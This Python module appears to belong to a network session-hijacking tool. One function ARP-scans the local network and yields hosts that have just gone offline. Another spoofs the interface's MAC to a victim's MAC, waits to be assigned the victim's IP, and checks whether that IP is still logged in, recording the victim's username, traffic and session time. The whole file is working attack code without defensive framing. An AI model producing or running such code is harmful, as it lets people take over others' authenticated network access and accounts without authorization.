import logging
from time import time, sleep

from .net_utils import *

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

def target_scaner(interface, min_interval=30):
    old_peers = {}
    while True:
        begin_time = time()
        peers = {}

        logger.info('Scanning targets...')
        for ip, mac in arp_scanner(interface):
            peers[ip] = mac
            if ip in old_peers:  # Still online
                del old_peers[ip]  # Remove it from old_peers
        # Now targets in old_peers
        logger.info("%d target(s) found", len(old_peers))
        for target in old_peers.items():
            yield target

        old_peers = peers

        # Wait for next scanning, if needed
        interval = time() - begin_time
        if interval < min_interval:
            sleep(min_interval - interval)
        
def try_target(target, interface, max_attempts=5, sleep_time=5):
    ip, mac = target
    logger.info('Trying target: %s, %s', ip, mac)

    if not spoof_mac(mac, interface):  # Failed to spoof mac
        logger.error('Failed to spoof the mac of %s to %s', interface, mac)
        return False

    for i in range(max_attempts):
        logger.info('Checking IP in %d s (attempt %d)', sleep_time, i)
        sleep(sleep_time)

        self_ip = get_ip()
        logger.info('IP now: %s', self_ip)
        if self_ip == ip:
            break
    else:  # Failed to get this IP
        logger.error('Failed to grab the IP %s', ip)
        return False

    infos = check_online()
    if infos:  # Succeeded
        logger.info('Got IP %s (%s, %s B, %s s)', ip,
                    infos['username'], infos['byte'], infos['duration'])
        return infos
    else:  # An offline IP
        logger.info('IP %s not online', ip)
        return False

